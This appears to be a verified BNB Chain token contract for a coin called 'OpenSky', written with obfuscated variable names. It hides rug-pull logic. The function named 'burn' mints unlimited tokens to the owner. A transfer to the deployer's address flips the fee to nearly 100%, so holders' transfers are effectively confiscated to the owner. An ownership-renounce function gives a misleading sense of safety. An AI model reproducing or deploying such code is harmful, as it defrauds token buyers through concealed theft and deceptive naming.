/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15
 */
pragma solidity >=0.6.0;
contract LVTLRPP {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  OUZXHG = 1000000000000000000;
address private  RAPBOY = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "OpenSky";
uint256 private  QLPYKV = 10000000000000;
address private  CNXVOX = address(0);
address private  MIREMF = address(0);
uint8 public constant decimals = 18;
uint256 private  JMORJZ = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant EVAESG = 99999;
uint256 private  AFLJYI = 1000000000000000000000;
uint256 private  HJIEXK = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  GLXJVC = address(0);
mapping (address => uint256) public balanceOf;
address public owner;
uint256 private  DZHMJF = 10000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  UFILCF = address(0);
string public  name = "OpenSky";
uint256 private  XCNPRS = 100000000;
function _getCNXVOX() private returns (address) {
return CNXVOX;
}

function _getUFILCF() private returns (address) {
return UFILCF;
}

function _getMIREMF() private returns (address) {
return MIREMF;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getJMORJZ() private returns (uint256) {
return JMORJZ;
}

function _getAFLJYI() private returns (uint256) {
return AFLJYI;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getDZHMJF() private returns (uint256) {
return DZHMJF;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SWBYBE");
require(to != address(0), "SWBYBE");
require(amount <= balanceOf[from], "SWBYBE");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* EVAESG/HJIEXK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==RAPBOY){
HJIEXK = EVAESG+2;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSWBYBE 0");
require(spender != address(0), "fSWBYBE 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () public {
RAPBOY = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getOUZXHG() private returns (uint256) {
return OUZXHG;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getQLPYKV() private returns (uint256) {
return QLPYKV;
}

function _getGLXJVC() private returns (address) {
return GLXJVC;
}

function _getXCNPRS() private returns (uint256) {
return XCNPRS;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}